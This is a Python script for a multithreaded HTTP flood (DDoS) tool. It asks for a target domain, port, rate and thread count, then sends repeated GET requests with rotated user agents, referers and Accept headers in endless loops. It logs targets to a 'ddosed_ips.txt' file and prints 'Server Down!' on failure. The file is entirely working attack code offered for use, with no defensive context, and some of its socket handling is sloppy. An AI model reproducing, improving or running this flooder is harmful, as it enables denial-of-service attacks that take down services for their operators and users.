import socket, random, sys, os, time, threading
import rich
from termcolor import colored
from rich import print
import colorama
from colorama import Fore, Back, Style
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = str(input(Fore.RED + '[+] DOMAIN: '))
host = str(socket.gethostbyname(ip))
print("[red]{ "+ip+"=IP "+host+" }[/red]")
port = int(input(Fore.RED + '[+] PORT (default 80): '))
print("[bold red][*] SLOW-2 0.4 | SLOW-1 0.3 | MEDIUM 0.2 | FAST-2 0.1 | FAST-1 0.0[/bold red]")
sleep = float(input(Fore.RED + '[+] SLEEP: '))
pack = int(input(Fore.RED + '[+] HTTP PACKET/s: '))
thread = int(input(Fore.RED + '[+] THREAD: '))
os.system('echo "DDOS attack on: '+ip+'" >> ddosed_ips.txt')

print("[bold red]connecting to target [/bold red][bold yellow]"+ip+"[/bold yellow]")

try:
    s.connect((str(ip),int(port)))
    print("[bold green]CONNECTED![/bold green]")
except:
    print("[bold red]NOT CONNECTED![/bold red]")

time.sleep(1)
print("[bold red]STARTING ATTACK...[/bold red]")
time.sleep(7)

try:
    host = str(socket.gethostbyname(ip))
except:
    print("[blue]could not find the domain name of[/blue][bold yellow] "+ip+"[/bold yellow]")
    sys.exit()

def start():
    global useragents, ref, acceptall
    useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
    ref=['http://www.bing.com/search?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://duckduckgo.com/?q=']
    acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"]
    hh = random._urandom(3016)
    xx = int(0)
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 1 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(host), int(port))
    main_req  = target_host + useragen + accept + reffer + content + length
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((str(host),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            time.sleep(sleep)
            print("[blue][+][/blue][yellow]HTTP PACKET sent> [ "+ip+"="+host+":{1} ]  | Sent: {2}[/yellow]".format(str(ip), int(port), xx))
        except:
            s.close()
            time.sleep(0.1)
            print("[bold green][+] Server Down![/bold green] [yellow]HTTP sent PACKET to>[/yellow] [bold red]"+ip+"[/bold red]")

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()

